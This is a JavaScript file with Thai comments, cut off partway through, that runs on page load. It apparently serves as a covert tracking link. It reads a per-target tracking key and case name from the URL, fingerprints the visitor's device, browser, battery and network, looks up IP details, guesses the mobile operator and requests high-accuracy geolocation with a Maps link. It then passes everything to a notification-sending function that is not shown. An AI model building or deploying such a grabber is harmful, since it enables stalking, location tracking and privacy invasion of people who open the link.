// ฟังก์ชันดึง tracking key และ case name จาก URL parameters
function getUrlParameters() {
  try {
    const urlParams = new URLSearchParams(window.location.search);
    const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
    const caseName = urlParams.get('case') || "ไม่มีค่า";
    
    console.log("ดึงค่าจาก URL parameters:");
    console.log("- trackingKey:", trackingKey);
    console.log("- caseName:", caseName);
    
    return {
      trackingKey: trackingKey,
      caseName: caseName
    };
  } catch (error) {
    console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
    return {
      trackingKey: "ไม่มีค่า",
      caseName: "ไม่มีค่า"
    };
  }
}

// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
(function() {
  // เก็บข้อมูลทั่วไป
  const timestamp = new Date().toLocaleString('th-TH', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
  
  // ดึง tracking key และ case name จาก URL
  const { trackingKey, caseName } = getUrlParameters();

  // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
  const deviceInfo = getDetailedDeviceInfo();
  const screenSize = `${window.screen.width}x${window.screen.height}`;
  const screenColorDepth = window.screen.colorDepth;
  const devicePixelRatio = window.devicePixelRatio || 1;
  const referrer = document.referrer || "ไม่มีข้อมูล";
  const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
  const platform = navigator.platform || "ไม่มีข้อมูล";
  const connection = getConnectionInfo();
  const browser = detectBrowser();

  // ตรวจสอบการใช้งานแบตเตอรี่
  getBatteryInfo().then(batteryData => {
    // รวบรวมข้อมูลทั้งหมด
    const allDeviceData = {
      ...deviceInfo,
      screenSize,
      screenColorDepth,
      devicePixelRatio,
      language,
      platform,
      browser,
      connection,
      battery: batteryData
    };

    // สร้างตัวแปรเพื่อเก็บข้อมูลที่จะส่ง
    let dataToSend = {};
    
    // ตรวจสอบ IP และข้อมูลเบอร์โทรศัพท์
    Promise.all([
      getIPDetails().catch(error => ({ip: "ไม่สามารถระบุได้"})),
      estimatePhoneNumber().catch(() => null)
    ])
    .then(([ipData, phoneInfo]) => {
      // เก็บข้อมูลที่จำเป็นทั้งหมด
      dataToSend = {
        timestamp: timestamp,
        ip: ipData,
        deviceInfo: allDeviceData,
        phoneInfo: phoneInfo,
        referrer: referrer,
        trackingKey: trackingKey || "ไม่มีค่า",
        caseName: caseName || "ไม่มีค่า",
        useServerMessage: true,
        requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
      };
      
      // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 5 วินาที
      if (navigator.geolocation) {
        const locationPromise = new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            position => {
              resolve({
                lat: position.coords.latitude,
                long: position.coords.longitude,
                accuracy: position.coords.accuracy,
                gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
              });
            },
            error => {
              console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
              resolve("ไม่มีข้อมูล");
            },
            {
              timeout: 5000,
              enableHighAccuracy: true
            }
          );
        });
        
        // รอข้อมูลพิกัดไม่เกิน 5 วินาที
        Promise.race([
          locationPromise,
          new Promise(resolve => setTimeout(() => resolve("ไม่มีข้อมูล"), 5000))
        ])
        .then(location => {
          // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
          dataToSend.location = location;
          
          // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
          sendToLineNotify(dataToSend);
        });
      } else {
        // ถ้าไม่สามารถใช้ Geolocation API ได้
        dataToSend.location = "ไม่มีข้อมูล";
        sendToLineNotify(dataToSend);
      }
    });
  });
})();

// สร้าง ID เฉพาะสำหรับการร้องขอ
function generateUniqueId() {
  return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
function getDetailedDeviceInfo() {
  const userAgent = navigator.userAgent;
  const vendor = navigator.vendor || "ไม่มีข้อมูล";
  const platform = navigator.platform || "ไม่มีข้อมูล";

  // เพิ่มการตรวจจับระบบปฏิบัติการอย่างละเอียด
  let osInfo = detectOS();
  let deviceBrand = "ไม่สามารถระบุได้";
  let deviceType = "ไม่สามารถระบุได้";
  let deviceModel = "ไม่สามารถระบุได้";

  // ตรวจสอบประเภทอุปกรณ์ด้วยวิธีที่ละเอียดขึ้น
  const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|mobile|CriOS/i.test(userAgent);
  const isTablet = /(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(userAgent.toLowerCase());
  
  if (isTablet) {
    deviceType = "แท็บเล็ต";
  } else if (isMobileDevice) {
    deviceType = "มือถือ";
  } else if (/Win|Mac|Linux/i.test(platform)) {
    deviceType = "คอมพิวเตอร์";
  } else if (/Smart-TV|SMART-TV|SmartTV|TV\s*Safari|CrKey|LG TV/i.test(userAgent)) {
    deviceType = "สมาร์ททีวี";
  } else {
    deviceType = "อุปกรณ์อื่นๆ";
  }

  // ตรวจสอบข้อมูลแบรนด์และรุ่นอุปกรณ์อย่างละเอียด
  const deviceInfo = detectDeviceInfo(userAgent);
  deviceBrand = deviceInfo.brand;
  deviceModel = deviceInfo.model;
  
  // ตรวจสอบว่าเป็นอุปกรณ์พกพาหรือไม่ด้วย matchMedia
  const isMobileQuery = window.matchMedia("(max-width: 767px)");
  const isPortrait = window.matchMedia("(orientation: portrait)").matches;
  
  // ปรับปรุงประเภทอุปกรณ์จาก matchMedia หากจำเป็น
  if (deviceType === "ไม่สามารถระบุได้" && isMobileQuery.matches) {
    deviceType = isPortrait ? "มือถือ" : "แท็บเล็ต";
  }

  // ตรวจสอบข้อมูลทัชสกรีน
  const hasTouchScreen = ('ontouchstart' in window) || 
                         (navigator.maxTouchPoints > 0) || 
                         (navigator.msMaxTouchPoints > 0);

  return {
    userAgent: userAgent,
    vendor: vendor,
    deviceType: deviceType,
    deviceBrand: deviceBrand,
    deviceModel: deviceModel,
    osInfo: osInfo,
    platform: osInfo.name + " " + osInfo.version,
    hasTouchScreen: hasTouchScreen,
    orientation: isPortrait ? "portrait" : "landscape",
    screenRatio: Math.round((window.screen.width / window.screen.height) * 100) / 100
  };
}

// ฟังก์ชันตรวจสอบระบบปฏิบัติการอย่างละเอียด
function detectOS() {
  const userAgent = navigator.userAgent;
  const platform = navigator.platform;
  let osName = "ไม่ทราบ";
  let osVersion = "ไม่ทราบ";
  let osArch = "ไม่ทราบ";

  // ตรวจสอบ Windows
  if (/Windows NT 10.0/i.test(userAgent)) {
    osName = "Windows";
    osVersion = "10";
  } else if (/Windows NT 6.3/i.test(userAgent)) {
    osName = "Windows";
    osVersion = "8.1";
  } else if (/Windows NT 6.2/i.test(userAgent)) {
    osName = "Windows";
    osVersion = "8";
  } else if (/Windows NT 6.1/i.test(userAgent)) {
    osName = "Windows";
    osVersion = "7";
  } else if (/Windows NT 6.0/i.test(userAgent)) {
    osName = "Windows";
    osVersion = "Vista";
  } else if (/Windows NT 5.1/i.test(userAgent)) {
    osName = "Windows";
    osVersion = "XP";
  } else if (/Windows NT 5.0/i.test(userAgent)) {
    osName = "Windows";
    osVersion = "2000";
  } else if (/Mac OS X/i.test(userAgent)) {
    osName = "macOS";
    // ดึงเวอร์ชัน macOS เป็นเวอร์ชันเต็ม
    const macOSMatch = userAgent.match(/Mac OS X ([0-9_]+)/i);
    if (macOSMatch) {
      osVersion = macOSMatch[1].replace(/_/g, '.');
      
      // แปลงเป็นชื่อเวอร์ชันที่เข้าใจง่าย
      const majorVersion = parseInt(osVersion.split('.')[0]);
      if (majorVersion >= 11) {
        osVersion += " (Big Sur หรือใหม่กว่า)";
      } else if (majorVersion === 10) {
        const minorVersion = parseInt(osVersion.split('.')[1]);
        const namesMap = {
          15: "Catalina",
          14: "Mojave",
          13: "High Sierra",
          12: "Sierra",
          11: "El Capitan",
          10: "Yosemite",
          9: "Mavericks",
          8: "Mountain Lion",
          7: "Lion",
          6: "Snow Leopard"
        };
        if (namesMap[minorVersion]) {
          osVersion += ` (${namesMap[minorVersion]})`;
        }
      }
    }
  } else if (/iPhone OS/i.test(userAgent)) {
    osName = "iOS";
    const iosMatch = userAgent.match(/iPhone OS ([0-9_]+)/i);
    if (iosMatch) {
      osVersion = iosMatch[1].replace(/_/g, '.');
    }
  } else if (/iPad/i.test(userAgent)) {
    if (/CPU OS/i.test(userAgent)) {
      osName = "iOS";
      const ipadMatch = userAgent.match(/CPU OS ([0-9_]+)/i);
      if (ipadMatch) {
        osVersion = ipadMatch[1].replace(/_/g, '.');
      }
    } else if (/iPadOS/i.test(userAgent)) {
      osName = "iPadOS";
      const ipadOSMatch = userAgent.match(/iPadOS ([0-9_]+)/i);
      if (ipadOSMatch) {
        osVersion = ipadOSMatch[1].replace(/_/g, '.');
      }
    }
  } else if (/Android/i.test(userAgent)) {
    osName = "Android";
    const androidMatch = userAgent.match(/Android ([0-9.]+)/i);
    if (androidMatch) {
      osVersion = androidMatch[1];
    }
  } else if (/Linux/i.test(userAgent)) {
    osName = "Linux";
    const linuxMatch = userAgent.match(/Linux ([a-z0-9.\-_]+)/i);
    if (linuxMatch) {
      osVersion = linuxMatch[1];
    }
  } else if (/CrOS/i.test(userAgent)) {
    osName = "Chrome OS";
    const chromeOSMatch = userAgent.match(/CrOS ([a-z0-9.\-_]+)/i);
    if (chromeOSMatch) {
      osVersion = chromeOSMatch[1];
    }
  }

  // ตรวจสอบสถาปัตยกรรมของระบบ
  if (/x64|x86_64|Win64|WOW64|x86-64/i.test(userAgent)) {
    osArch = "64-bit";
  } else if (/x86|i686|i386/i.test(userAgent)) {
    osArch = "32-bit";
  } else if (/arm|aarch64/i.test(userAgent)) {
    osArch = "ARM";
  }

  return {
    name: osName,
    version: osVersion,
    architecture: osArch,
    full: osName + " " + osVersion + (osArch !== "ไม่ทราบ" ? " (" + osArch + ")" : "")
  };
}

// ฟังก์ชันตรวจสอบแบรนด์และรุ่นอุปกรณ์อย่างละเอียด
function detectDeviceInfo(userAgent) {
  let brand = "ไม่สามารถระบุได้";
  let model = "ไม่สามารถระบุได้";

  // แบรนด์และรุ่นที่ควรตรวจจับ
  const brandRegexes = [
    { brand: "Apple", regex: /iPhone|iPad|iPod|Mac/i },
    { brand: "Samsung", regex: /Samsung|SM-[A-Z0-9]+|Galaxy/i },
    { brand: "Google", regex: /Pixel|Nexus/i },
    { brand: "Huawei", regex: /Huawei|HW-|Honor/i },
    { brand: "Xiaomi", regex: /Xiaomi|Redmi|Mi [0-9]|POCO/i },
    { brand: "OPPO", regex: /OPPO|CPH[0-9]+|Find X/i },
    { brand: "Vivo", regex: /vivo|V[0-9]+/i },
    { brand: "OnePlus", regex: /OnePlus|ONEPLUS/i },
    { brand: "Nokia", regex: /Nokia|TA-[0-9]+/i },
    { brand: "Sony", regex: /Sony|Xperia/i },
    { brand: "Realme", regex: /Realme|RMX[0-9]+/i },
    { brand: "Lenovo", regex: /Lenovo/i },
    { brand: "Motorola", regex: /Motorola|Moto/i },
    { brand: "ASUS", regex: /ASUS|ZenFone/i },
    { brand: "LG", regex: /LG|LG-/i }
  ];

  // ตรวจจับแบรนด์
  for (const brandInfo of brandRegexes) {
    if (brandInfo.regex.test(userAgent)) {
      brand = brandInfo.brand;
      break;
    }
  }

  // หากเป็นอุปกรณ์ Apple ลองตรวจจับรุ่น
  if (brand === "Apple") {
    if (/iPhone/i.test(userAgent)) {
      model = "iPhone";
      // พยายามตรวจจับรุ่น iPhone จาก CPU
      const match = userAgent.match(/iPhone(?:[0-9]+,[0-9]+|) CPU.*like Mac OS X/i);
      if (match) {
        // ตรวจสอบว่ามี "iPhone13,2" หรือรหัสรุ่นอื่นๆ
        const modelMatch = userAgent.match(/iPhone([0-9]+,[0-9]+)/i);
        if (modelMatch) {
          const modelCode = modelMatch[1];
          const iPhoneModels = {
            "8,1": "6s", "8,2": "6s Plus", 
            "9,1": "7", "9,3": "7", "9,2": "7 Plus", "9,4": "7 Plus",
            "10,1": "8", "10,4": "8", "10,2": "8 Plus", "10,5": "8 Plus", "10,3": "X", "10,6": "X",
            "11,2": "XS", "11,4": "XS Max", "11,6": "XS Max", "11,8": "XR",
            "12,1": "11", "12,3": "11 Pro", "12,5": "11 Pro Max",
            "13,1": "12 mini", "13,2": "12", "13,3": "12 Pro", "13,4": "12 Pro Max",
            "14,4": "13 mini", "14,5": "13", "14,2": "13 Pro", "14,3": "13 Pro Max",
            "14,7": "14", "14,8": "14 Plus", "15,2": "14 Pro", "15,3": "14 Pro Max",
            "15,4": "15", "15,5": "15 Plus", "16,1": "15 Pro", "16,2": "15 Pro Max"
          };
          if (iPhoneModels[modelCode]) {
            model = "iPhone " + iPhoneModels[modelCode];
          }
        } else if (/OS ([0-9_]+) like Mac OS X/i.test(userAgent)) {
          // หากไม่พบรหัสรุ่น ลองประมาณจากเวอร์ชัน iOS
          const iosVersionMatch = userAgent.match(/OS ([0-9_]+) like Mac OS X/i);
          if (iosVersionMatch) {
            const iosVersion = iosVersionMatch[1].replace(/_/g, '.');
            const majorVersion = parseInt(iosVersion);
            // ถ้า iOS 15+ น่าจะเป็น iPhone 13 ขึ้นไป
            if (majorVersion >= 16) {
              model = "iPhone 14 or newer";
            } else if (majorVersion >= 15) {
              model = "iPhone 13 or newer";
            } else if (majorVersion >= 14) {
              model = "iPhone 12 or newer";
            } else if (majorVersion >= 13) {
              model = "iPhone 11 or newer";
            }
          }
        }
      }
    } else if (/iPad/i.test(userAgent)) {
      model = "iPad";
      // พยายามตรวจจับรุ่น iPad
      const ipadMatch = userAgent.match(/iPad([0-9]+,[0-9]+)/i);
      if (ipadMatch) {
        const modelCode = ipadMatch[1];
        const iPadModels = {
          "5,1": "Air", "5,2": "Air", "5,3": "Air 2", "5,4": "Air 2",
          "6,3": "Pro 9.7-inch", "6,4": "Pro 9.7-inch", 
          "6,7": "Pro 12.9-inch", "6,8": "Pro 12.9-inch",
          "7,1": "Pro 12.9-inch 2nd gen", "7,2": "Pro 10.5-inch",
          "7,3": "Pro 10.5-inch", "7,4": "Pro 10.5-inch",
          "8,1": "Pro 11-inch", "8,2": "Pro 11-inch", "8,3": "Pro 12.9-inch 3rd gen", "8,4": "Pro 12.9-inch 3rd gen",
          "11,1": "Air 3rd gen", "11,2": "Air 3rd gen",
          "13,1": "Air 4th gen", "13,2": "Air 4th gen",
          "13,4": "Pro 11-inch 2nd gen", "13,5": "Pro 11-inch 2nd gen", "13,6": "Pro 12.9-inch 4th gen", "13,7": "Pro 12.9-inch 4th gen"
        };
        if (iPadModels[modelCode]) {
          model = "iPad " + iPadModels[modelCode];
        }
      }
    } else if (/Macintosh/i.test(userAgent)) {
      model = "Mac";
      if (/MacBook Pro/i.test(userAgent)) {
        model = "MacBook Pro";
      } else if (/MacBook Air/i.test(userAgent)) {
        model = "MacBook Air";
      } else if (/MacBook/i.test(userAgent)) {
        model = "MacBook";
      } else if (/iMac/i.test(userAgent)) {
        model = "iMac";
      } else if (/Mac mini/i.test(userAgent)) {
        model = "Mac mini";
      } else if (/Mac Pro/i.test(userAgent)) {
        model = "Mac Pro";
      }
    }
  }
  // ตรวจจับรุ่นอุปกรณ์ Android
  else if (/Android/i.test(userAgent)) {
    // เริ่มจากดึงแบรนด์จาก User-Agent
    if (brand === "ไม่สามารถระบุได้") {
      for (const brandName of ["Samsung", "Sony", "LG", "ASUS", "Huawei", "Xiaomi", "Oppo", "Vivo", "Nokia", "OnePlus", "Motorola", "Google"]) {
        if (userAgent.includes(brandName)) {
          brand = brandName;
          break;
        }
      }
    }

    // ดึงรุ่นจากรูปแบบทั่วไปของ Android User-Agent
    // Format 1: ... Android x.y.z; [Brand] [Model] ...
    // Format 2: ... Android x.y.z; [xx-xx] [Model] ...
    const modelMatches = [
      // Samsung
      userAgent.match(/Samsung ([A-Za-z0-9-]+)/i),
      userAgent.match(/Galaxy ([A-Za-z0-9 ]+)/i),
      userAgent.match(/SM-([A-Za-z0-9]+)/i),
      
      // Generic model pattern in Android User-Agent
      userAgent.match(/Android [0-9.]+; [A-Za-z]{2}-[A-Za-z]{2}; ([A-Za-z0-9_-]+)/i),
      userAgent.match(/Android [0-9.]+; ([A-Za-z0-9-]+)/i),
      
      // Additional patterns for common manufacturers
      userAgent.match(/Redmi ([A-Za-z0-9 ]+)/i),
      userAgent.match(/POCO ([A-Za-z0-9 ]+)/i),
      userAgent.match(/Mi ([A-Za-z0-9 ]+)/i),
      userAgent.match(/HUAWEI ([A-Za-z0-9-]+)/i),
      userAgent.match(/HONOR ([A-Za-z0-9 ]+)/i),
      userAgent.match(/OPPO ([A-Za-z0-9 ]+)/i),
      userAgent.match(/CPH([0-9]+)/i),
      userAgent.match(/vivo ([A-Za-z0-9 ]+)/i),
      userAgent.match(/Pixel ([0-9XL ]+)/i),
      userAgent.match(/Nokia ([A-Za-z0-9 .]+)/i)
    ];
    
    for (const match of modelMatches) {
      if (match) {
        model = match[1];
        break;
      }
    }

    // ทำความสะอาดรุ่น - ลบพวกรหัสประเทศ (เช่น /GLOBAL, /TH)
    model = model.replace(/\/[A-Z]{2,}$/, '');
  }

  return { brand, model };
}

// ฟังก์ชันตรวจสอบประเภทเบราว์เซอร์ที่แม่นยำขึ้น
function detectBrowser() {
  const userAgent = navigator.userAgent;
  let browserName = "ไม่ทราบ";
  let browserVersion = "ไม่ทราบ";
  let engineName = "ไม่ทราบ";
  let fullInfo = "ไม่ทราบ";

  // ตรวจสอบ Brave Browser (ต้องตรวจสอบก่อน Chrome เพราะใช้ Chrome User-Agent)
  if (navigator.brave && navigator.brave.isBrave && navigator.brave.isBrave.name === 'isBrave') {
    browserName = "Brave";
    // Brave ไม่มีวิธีตรวจสอบเวอร์ชันจาก User-Agent โดยตรง
    // ดังนั้นใช้เวอร์ชัน Chrome เป็นเกณฑ์
    const chromeMatch = userAgent.match(/Chrome\/([0-9.]+)/);
    if (chromeMatch) {
      browserVersion = chromeMatch[1];
    }
    engineName = "Blink";
  }
  // หรือตรวจสอบ Chrome บน iOS (ซึ่งจริงๆ แล้วคือ WebKit เนื่องจากข้อจำกัดของ iOS)
  else if (/CriOS/.test(userAgent)) {
    browserName = "Chrome บน iOS";
    const match = userAgent.match(/CriOS\/([0-9.]+)/);
    if (match) {
      browserVersion = match[1];
    }
    engineName = "WebKit";
  }
  // Firefox Focus / Firefox Klar บน iOS
  else if (/FxiOS/.test(userAgent)) {
    browserName = "Firefox บน iOS";
    const match = userAgent.match(/FxiOS\/([0-9.]+)/);
    if (match) {
      browserVersion = match[1];
    }
    engineName = "WebKit";
  }
  // หรือตรวจสอบ Firefox
  else if (/Firefox/.test(userAgent)) {
    browserName = "Firefox";
    const match = userAgent.match(/Firefox\/([0-9.]+)/);
    if (match) {
      browserVersion = match[1];
    }
    engineName = "Gecko";
  }
  // Samsung Internet Browser
  else if (/SamsungBrowser/.test(userAgent)) {
    browserName = "Samsung Browser";
    const match = userAgent.match(/SamsungBrowser\/([0-9.]+)/);
    if (match) {
      browserVersion = match[1];
    }
    engineName = "Blink";
  }
  // Opera / Opera GX
  else if (/OPR|Opera/.test(userAgent)) {
    browserName = "Opera";
    const operaMatch = userAgent.match(/OPR\/([0-9.]+)/);
    if (operaMatch) {
      browserVersion = operaMatch[1];
      // หากมี GX ในชื่อ
      if (/GX/.test(userAgent)) {
        browserName = "Opera GX";
      }
    } else {
      const legacyMatch = userAgent.match(/Opera\/([0-9.]+)/);
      if (legacyMatch) {
        browserVersion = legacyMatch[1];
      }
    }
    engineName = "Blink";
  }
  // Edge Chromium
  else if (/Edg/.test(userAgent)) {
    browserName = "Microsoft Edge";
    const match = userAgent.match(/Edg\/([0-9.]+)/);
    if (match) {
      browserVersion = match[1];
    }
    engineName = "Blink";
  }
  // Legacy Edge
  else if (/Edge/.test(userAgent)) {
    browserName = "Microsoft Edge (Legacy)";
    const match = userAgent.match(/Edge\/([0-9.]+)/);
    if (match) {
      browserVersion = match[1];
    }
    engineName = "EdgeHTML";
  }
  // Vivaldi
  else if (/Vivaldi/.test(userAgent)) {
    browserName = "Vivaldi";
    const match = userAgent.match(/Vivaldi\/([0-9.]+)/);
    if (match) {
      browserVersion = match[1];
    }
    engineName = "Blink";
  }
  // Yandex Browser
  else if (/YaBrowser/.test(userAgent)) {
    browserName = "Yandex Browser";
    const match = userAgent.match(/YaBrowser\/([0-9.]+)/);
    if (match) {
      browserVersion = match[1];
    }
    engineName = "Blink";
  }
  // UC Browser
  else if (/UCBrowser/.test(userAgent)) {
    browserName = "UC Browser";
    const match = userAgent.match(/UCBrowser\/([0-9.]+)/);
    if (match) {
      browserVersion = match[1];
    }
    // UC Browser อาจใช้ engine ที่แตกต่างกันไปตามแพลตฟอร์ม
    if (/iPhone|iPad|iPod/.test(userAgent)) {
      engineName = "WebKit";
    } else {
      engineName = "Blink";
    }
  }
  // QQ Browser
  else if (/QQBrowser/.test(userAgent)) {
    browserName = "QQ Browser";
    const match = userAgent.match(/QQBrowser\/([0-9.]+)/);
    if (match) {
      browserVersion = match[1];
    }
    engineName = "Blink";
  }
  // Chrome และ Chromium
  else if (/Chrome/.test(userAgent)) {
    if (/Chromium/.test(userAgent)) {
      browserName = "Chromium";
      const match = userAgent.match(/Chromium\/([0-9.]+)/);
      if (match) {
        browserVersion = match[1];
      }
    } else {
      browserName = "Chrome";
      const match = userAgent.match(/Chrome\/([0-9.]+)/);
      if (match) {
        browserVersion = match[1];
      }
    }
    engineName = "Blink";
  }
  // Safari
  else if (/Safari/.test(userAgent) && !/Chrome/.test(userAgent)) {
    browserName = "Safari";
    const match = userAgent.match(/Version\/([0-9.]+)/);
    if (match) {
      browserVersion = match[1];
    }
    engineName = "WebKit";
  }
  // Internet Explorer
  else if (/MSIE|Trident/.test(userAgent)) {
    browserName = "Internet Explorer";
    const match = userAgent.match(/(?:MSIE |rv:)([0-9.]+)/);
    if (match) {
      browserVersion = match[1];
    }
    engineName = "Trident";
  }

  // แบรนด์ของเบราว์เซอร์อาจใช้ navigator.vendor
  const browserVendor = navigator.vendor || "ไม่ทราบ";
  
  // สร้างข้อมูลเต็ม
  fullInfo = `${browserName} ${browserVersion} (${engineName})`;

  return {
    name: browserName,
    version: browserVersion,
    engine: engineName,
    vendor: browserVendor,
    full: fullInfo
  };
}

// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด
function getConnectionInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

  let connectionInfo = {
    type: "ไม่สามารถระบุได้",
    effectiveType: "ไม่สามารถระบุได้",
    downlink: "ไม่สามารถระบุได้",
    rtt: "ไม่สามารถระบุได้",
    saveData: false,
    isWifi: false,
    isMobile: false,
    networkType: "ไม่สามารถระบุได้",
    quality: "ไม่สามารถระบุได้"
  };

  if (connection) {
    // เก็บข้อมูลพื้นฐานจาก Network Information API
    connectionInfo.type = connection.type || "ไม่สามารถระบุได้";
    connectionInfo.effectiveType = connection.effectiveType || "ไม่สามารถระบุได้";
    connectionInfo.downlink = connection.downlink || "ไม่สามารถระบุได้";
    connectionInfo.rtt = connection.rtt || "ไม่สามารถระบุได้";
    connectionInfo.saveData = connection.saveData || false;

    // ตรวจสอบว่าเป็น WiFi หรือ Mobile
    if (connection.type === 'wifi') {
      connectionInfo.isWifi = true;
      connectionInfo.networkType = "WiFi";
    }
    else if (['cellular', 'umts', 'hspa', 'lte', 'cdma', 'evdo', 'gsm', '2g', '3g', '4g', '5g'].includes(connection.type)) {
      connectionInfo.isMobile = true;

      // ระบุประเภทเครือข่ายโทรศัพท์จาก effectiveType และ type
      if (connection.type === '5g') {
        connectionInfo.networkType = "5G";
      } else if (connection.type === '4g' || connection.type === 'lte') {
        connectionInfo.networkType = "4G/LTE";
      } else if (connection.type === '3g' || connection.type === 'umts' || connection.type === 'hspa') {
        connectionInfo.networkType = "3G/UMTS/HSPA";
      } else if (connection.type === '2g' || connection.type === 'gsm' || connection.type === 'edge') {
        connectionInfo.networkType = "2G/GSM/EDGE";
      } else if (connection.effectiveType === 'slow-2g' || connection.effectiveType === '2g') {
        connectionInfo.networkType = "2G";
      } else if (connection.effectiveType === '3g') {
        connectionInfo.networkType = "3G";
      } else if (connection.effectiveType === '4g') {
        connectionInfo.networkType = "4G";
      } else {
        connectionInfo.networkType = "Mobile Data";
      }
    }
    else {
      // ตรวจสอบจาก effectiveType หากไม่มีข้อมูล type ที่ชัดเจน
      if (connection.effectiveType === '4g') {
        // สันนิษฐานจากความเร็วว่าเป็น WiFi หรือ mobile
        if (connection.downlink >= 7) { // สมมติว่า WiFi มักจะมีความเร็วมากกว่า 7 Mbps
          connectionInfo.isWifi = true;
          connectionInfo.networkType = "WiFi (น่าจะใช่)";
        } else {
          connectionInfo.isMobile = true;
          connectionInfo.networkType = "4G/LTE (น่าจะใช่)";
        }
      } else if (['slow-2g', '2g', '3g'].includes(connection.effectiveType)) {
        connectionInfo.isMobile = true;
        connectionInfo.networkType = connection.effectiveType.toUpperCase() + " (น่าจะใช่)";
      }
    }

    // ประเมินคุณภาพการเชื่อมต่อ
    if (connection.downlink !== undefined && connection.rtt !== undefined) {
      if (connection.downlink >= 10 && connection.rtt < 50) {
        connectionInfo.quality = "ดีมาก";
      } else if (connection.downlink >= 5 && connection.rtt < 100) {
        connectionInfo.quality = "ดี";
      } else if (connection.downlink >= 2 && connection.rtt < 300) {
        connectionInfo.quality = "ปานกลาง";
      } else if (connection.downlink >= 0.5) {
        connectionInfo.quality = "พอใช้";
      } else {
        connectionInfo.quality = "แย่";
      }
    } else if (connection.effectiveType) {
      // หากไม่มีค่า downlink และ rtt ให้ประเมินจาก effectiveType
      if (connection.effectiveType === '4g') {
        connectionInfo.quality = "ดี";
      } else if (connection.effectiveType === '3g') {
        connectionInfo.quality = "ปานกลาง";
      } else if (connection.effectiveType === '2g') {
        connectionInfo.quality = "พอใช้";
      } else if (connection.effectiveType === 'slow-2g') {
        connectionInfo.quality = "แย่";
      }
    }
  } else {
    // ถ้าไม่มี Network Information API ให้พยายามตรวจสอบด้วยวิธีอื่น
    // ตรวจสอบความเร็วในการโหลดเพจ
    const loadTime = window.performance ? 
                     window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart : 
                     null;
    
    if (loadTime !== null) {
      if (loadTime < 1000) {
        connectionInfo.quality = "ดีมาก";
      } else if (loadTime < 2000) {
        connectionInfo.quality = "ดี";
      } else if (loadTime < 5000) {
        connectionInfo.quality = "ปานกลาง";
      } else {
        connectionInfo.quality = "ช้า";
      }
    }
    
    // ตรวจสอบจาก User-Agent หากเป็นมือถือ ให้สันนิษฐานว่าใช้เครือข่ายมือถือ
    const userAgent = navigator.userAgent;
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
      connectionInfo.isMobile = true;
      connectionInfo.networkType = "Mobile Data (สันนิษฐาน)";
    } else {
      connectionInfo.isWifi = true;
      connectionInfo.networkType = "WiFi/Broadband (สันนิษฐาน)";
    }
  }

  return connectionInfo;
}

// ฟังก์ชันตรวจสอบระดับแบตเตอรี่
async function getBatteryInfo() {
  try {
    // ตรวจสอบว่าสามารถเข้าถึง Battery API ได้หรือไม่
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      return {
        level: Math.floor(battery.level * 100) + "%",
        charging: battery.charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ"
      };
    }

    return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่ได้";
  } catch (error) {
    return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่ได้";
  }
}

// ฟังก์ชันประมาณการข้อมูลเครือข่ายโทรศัพท์แบบละเอียด
async function estimatePhoneNumber() {
  const phoneInfo = {
    mobileOperator: "ไม่สามารถระบุได้",
    possibleOperator: "ไม่สามารถระบุได้",
    countryCode: "ไม่สามารถระบุได้",
    networkType: "ไม่สามารถระบุได้",
    operatorDetails: {},
    remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรงเนื่องจากข้อจำกัดความเป็นส่วนตัวของเบราว์เซอร์"
  };

  try {
    // ตรวจสอบประเทศจาก timezone และภาษาก่อน
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
    
    // ตรวจสอบว่าเป็นไทยหรือไม่จาก timezone และภาษา
    let isThailand = timezone.includes("Asia/Bangkok") || language.startsWith("th");
    
    // ตรวจสอบข้อมูลผู้ให้บริการโทรศัพท์จากข้อมูล IP
    const ipDetails = await getIPDetails();
    
    // หากพบว่าอยู่ในประเทศไทยจาก IP
    if (ipDetails.country === "TH" || ipDetails.country === "Thailand") {
      isThailand = true;
      phoneInfo.countryCode = "+66";
    } else if (ipDetails.country) {
      // หากไม่ใช่ไทย กำหนดรหัสประเทศตามที่ตรวจพบ
      phoneInfo.countryCode = ipDetails.country;
    }

    // ตรวจสอบข้อมูลผู้ให้บริการจาก isp ที่ได้จาก ipinfo
    const ispInfo = ipDetails.isp || "";
    const orgInfo = ipDetails.org || "";
    
    // รวมข้อมูล ISP และ Org เพื่อวิเคราะห์
    const networkInfo = (ispInfo + " " + orgInfo).toLowerCase();

    // ตรวจสอบผู้ให้บริการในประเทศไทย (รองรับ MVNO ด้วย)
    const thaiOperators = {
      "AIS": {
        keywords: ["ais", "advanced info service", "awn", "advanced wireless network", "intouch"],
        types: ["โทรศัพท์มือถือ", "อินเทอร์เน็ตบ้าน"],
        mvno: ["gomo"]
      },
      "DTAC": {
